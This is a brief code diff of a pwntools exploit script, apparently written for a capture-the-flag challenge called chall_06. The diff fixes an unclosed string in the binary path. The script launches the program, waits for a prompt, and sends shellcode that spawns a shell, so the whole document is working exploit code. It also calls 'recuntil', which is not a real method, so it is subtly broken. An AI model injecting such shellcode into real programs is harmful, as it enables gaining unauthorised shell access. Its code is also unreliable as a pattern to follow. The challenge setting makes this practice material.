@@ -1,5 +1,5 @@
 from pwn import *
-binary = context.binary = ELF('./chall_06)
+binary = context.binary = ELF('./chall_06')
 p = process(binary.path)
 p.recuntil('I drink milk even though i\'m lactose intolerant: ')
 p.sendline(b'' + asm(shellcraft.sh()))
